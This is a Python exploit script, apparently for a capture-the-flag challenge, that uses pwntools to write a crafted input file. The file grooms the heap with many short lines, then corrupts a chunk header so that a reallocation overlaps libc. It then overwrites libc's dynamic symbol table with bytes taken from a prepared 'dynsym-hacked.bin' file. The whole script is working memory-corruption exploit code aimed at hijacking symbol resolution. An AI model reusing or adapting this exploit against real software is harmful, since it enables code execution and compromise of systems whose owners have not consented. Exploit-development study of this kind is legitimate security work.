#!/usr/bin/env python3

import sys
import os
from pwn import *
import time

def size():
    n = 128
    while True:
        yield n
        n = 2*n + 2

MAX_LEN = 1090519038
NUM_PATTERNS = 0xc600

MMAP_SIZE = 128*1024
longstr = b'y'*MAX_LEN

gen = size()
sizes = [133118, 266238, 532478, 1064958, 2129918, 4259838, 8519678, 17039358, 34078718, 68157438, 136314878, 272629758, 545259518, 1090519038]

# need to make the pattern chunk smaller

start = time.time()
print("Making pattern file...")
file = open("patt", "wb")

print("Writing feng shui nonsense...")

for i in range(0xc600): # p 6
    file.write(b'a\n')

file.write(b'a\x00'+b'a'*133114+b'\n') # ds 1

for i in range(0x300): # p 6+
    file.write(b'a\n')

file.write(b'a\x00'+b'a'*1064954+b'\n') # ds 8

for i in range(0x1cd00): # p 13+
    file.write(b'a\n')

file.write(b'a\x00'+b'a'*4259834+b'\n') # ds 32

for i in range(0x56400): # p 34+
    file.write(b'a\n')

file.write(b'a\x00'+b'a'*17039354+b'\n') # ds 128

for i in range(0x10e000): # p 100+
    file.write(b'a\n')

file.write(b'a\x00'+b'a'*34078714+b'\n') # ds 256

for i in range(0x3a2000): # p 328+
    file.write(b'a\n')

file.write(b'a\x00'+b'a'*136314874+b'\n') # ds 1024

for i in range(0x94c000): # p 912+
    file.write(b'a\n')

file.write(b'a\x00'+b'a'*272629754+b'\n') # ds 2048

for i in range(0x1ec8000): # p 2848+
    file.write(b'a\n')

file.write(b'a\x00'+b'a'*1090519034+b'\n') # ds 2048

print("Finished feng shui!")

print("Filling gap and corrputing pattern chunk...")

file.write(b'a'*(0x26e7e000-1) + b'\n') # fill the gap

file.write(b'a\x00')
file.write(b'a'*(0x7fffba21b000 - 0x7fff7921a000 - 16 -2))
file.write(p64(0))
file.write(p64((0x7ffff7e0d000 - 0x7fffba21b000)|2))
file.write(b'\n') #corrupt

file.write(b'a\n') # one more to trigger the realloc

print("Corrupted!")

print("Overwriting libc...")

file.write(b'a'*0x27172000+b'\n') # allocate libc chunk

#libc dynsym overwrite
file.write(b'a\x00')
file.write(b'a'*(0x7fffba21b000 - 0x7fff7921a000 - 16 -2))
file.write(p64(0))
file.write(p64(0x16a7f002))
file.write(b'a'*0x3dbccff0)

length = 2 + (0x7ffff7de8000 - 0x7fff7921a000 - 2 - 16)

for c in open("dynsym-hacked.bin", "rb").read():
    length += 1
    if length >= 0x7ebf2ff0-2:
        break
    if c != 0x0a:
        file.write(bytes([c]))
    else:
        file.write(bytes([0x0b])) # doing a big heckin hope that this works out okay

file.write(b'\n')

print("Finished libc overwrite!")
print("Length of libc overwrite string: {:}".format(hex(length)))

file.close()
# os.system("chmod +x ./patt")
print("Finished in {:.3f} seconds.".format(time.time()-start))